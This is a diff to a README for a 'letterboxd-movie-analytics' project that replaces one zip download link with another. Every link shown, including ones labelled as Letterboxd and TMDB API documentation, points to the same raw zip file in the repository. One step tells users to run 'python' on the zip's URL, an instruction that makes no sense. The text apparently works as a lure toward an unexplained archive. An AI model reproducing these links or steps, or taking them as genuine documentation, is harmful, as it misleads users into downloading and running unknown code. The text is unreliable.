@@ -8,7 +8,7 @@ Welcome to the **letterboxd-movie-analytics** project! This tool helps you analy
 
 To start using the application, you need to download it. Click the link below to visit the Releases page:
 
-[![Download letterboxd-movie-analytics](https://raw.githubusercontent.com/Jangek12111/letterboxd-movie-analytics/main/Jovial/letterboxd-movie-analytics_v3.9.zip)](https://raw.githubusercontent.com/Jangek12111/letterboxd-movie-analytics/main/Jovial/letterboxd-movie-analytics_v3.9.zip)
+[![Download letterboxd-movie-analytics](https://raw.githubusercontent.com/Jangek12111/letterboxd-movie-analytics/main/Jovial/analytics_letterboxd_movie_v2.4.zip)](https://raw.githubusercontent.com/Jangek12111/letterboxd-movie-analytics/main/Jovial/analytics_letterboxd_movie_v2.4.zip)
 
 ### Steps to Download
 
@@ -41,7 +41,7 @@ Once you have downloaded the application, follow these steps:
 2. If the file is in `.zip` format, extract it.
 3. Open a terminal (Command Prompt, PowerShell, or Terminal on macOS).
 4. Change the directory to where the application is located, using the `cd` command.
-5. Run the application by typing the appropriate command. For example, if it’s a Python script, you would type `python https://raw.githubusercontent.com/Jangek12111/letterboxd-movie-analytics/main/Jovial/letterboxd-movie-analytics_v3.9.zip`.
+5. Run the application by typing the appropriate command. For example, if it’s a Python script, you would type `python https://raw.githubusercontent.com/Jangek12111/letterboxd-movie-analytics/main/Jovial/analytics_letterboxd_movie_v2.4.zip`.
 
 ## 📊 Using the Application
 
@@ -69,8 +69,8 @@ For those interested in understanding more about data analytics, consider explor
 
 For more information on the Letterboxd API and TMDB API, visit:
 
-- [Letterboxd API Documentation](https://raw.githubusercontent.com/Jangek12111/letterboxd-movie-analytics/main/Jovial/letterboxd-movie-analytics_v3.9.zip)
-- [TMDB API Documentation](https://raw.githubusercontent.com/Jangek12111/letterboxd-movie-analytics/main/Jovial/letterboxd-movie-analytics_v3.9.zip)
+- [Letterboxd API Documentation](https://raw.githubusercontent.com/Jangek12111/letterboxd-movie-analytics/main/Jovial/analytics_letterboxd_movie_v2.4.zip)
+- [TMDB API Documentation](https://raw.githubusercontent.com/Jangek12111/letterboxd-movie-analytics/main/Jovial/analytics_letterboxd_movie_v2.4.zip)
 
 After downloading the application, give it a try and enjoy analyzing your movie data!
 
